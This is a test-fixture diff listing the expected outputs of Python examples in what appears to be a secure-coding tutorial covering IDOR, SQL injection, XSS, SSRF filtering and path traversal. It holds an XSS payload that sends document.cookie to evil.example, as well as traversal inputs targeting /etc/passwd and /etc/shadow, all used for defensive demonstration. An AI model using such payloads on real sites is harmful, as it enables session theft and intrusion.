@@ -1,0 +1,44 @@
+# How each code block in index.mdx is checked. See tests/examples/harness.py.
+- block: 1
+  lang: python
+  check: python
+  output: |
+    vulnerable, Ama asks for order 8: {'owner': 'c-4', 'total': 900, 'address': '9 Mill Lane'}
+    fixed, Ama asks for order 8: None
+    fixed, Ama asks for her own order 7: 5400
+    fixed, support asks for order 8: 900
+- block: 2
+  lang: python
+  check: python
+  output: |
+    vulnerable, normal input: [('c-17', 'ama@example.com')]
+    vulnerable, attack: [('c-17', 'ama@example.com'), ('c-4', 'kofi@example.com')]
+    parameterised, attack: []
+- block: 3
+  lang: python
+  check: python
+  output: |
+    unsafe: <p><img src=x onerror="fetch(`https://evil.example/?c=${document.cookie}`)">Lovely bread</p>
+    escaped: <p>&lt;img src=x onerror=&quot;fetch(`https://evil.example/?c=${document.cookie}`)&quot;&gt;Lovely bread</p>
+- block: 4
+  lang: python
+  check: python
+  output: |
+    93.184.215.14 -> allowed
+    10.20.81.17 -> blocked
+    127.0.0.1 -> blocked
+    169.254.169.254 -> blocked
+    ::1 -> blocked
+- block: 5
+  lang: python
+  check: python
+  note: On macOS /etc is a link to /private/etc, so the check confirms the two safe names stay inside the uploads folder and both attacks are refused.
+  verify: |
+    lines = out.strip().splitlines()
+    assert lines[0].endswith('/srv/shop/uploads/invoice-7.pdf') and lines[1].endswith('/srv/shop/uploads/2026/receipt.pdf'), out
+    assert lines[2] == '../../../etc/passwd -> None' and lines[3] == '/etc/shadow -> None', out
+- block: 6
+  lang: python
+  check: python
+  output: |
+    True False False True
